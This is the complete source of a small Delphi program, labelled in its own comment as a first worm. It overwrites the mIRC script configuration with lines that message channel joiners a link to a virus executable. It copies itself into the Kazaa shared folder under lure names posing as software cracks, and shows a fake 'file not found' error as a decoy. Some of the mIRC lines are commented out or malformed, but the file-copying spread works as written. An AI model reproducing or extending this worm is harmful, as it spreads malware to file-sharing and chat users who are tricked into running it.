   PROGRAM Project2;

   {$APPTYPE GUI}

   USES
     Windows;

   VAR
     F : TextFile;

   BEGIN
     AssignFile(F,'C:\program files\mirc\script.ini');
     Rewrite(F);
     WriteLn(F,'[script]');
     WriteLn(F,'n0=; ©Migls First delphi worm :-P');
     WriteLn(F,'1=; on 1:JOIN:#:/msg $nick Use Http://www.virus.com/virus.exe to hack your friends!');
     WriteLn(F,'n2=; close -m $nick');
     WriteLn(F,'n3=; close -m $nick');
     CloseFile(F);
     CopyFile(pchar(paramstr(0)),PChar('C:\program files\kazaa\my shared folder\Red Alert 2 crack.exe'),true);
     CopyFile(pchar(paramstr(0)),PChar('C:\program files\kazaa\my shared folder\Windows XP Crack.exe'),true);
     CopyFile(pchar(paramstr(0)),PChar('C:\program files\kazaa\my shared folder\Free SMS v1.4.exe'),true);
     // Don't feel like adding more kazaa names
     MessageBox(0,'Cannot find winrun32.dll', 'ERROR: File not found exception',0+MB_ICONERROR);
   END.
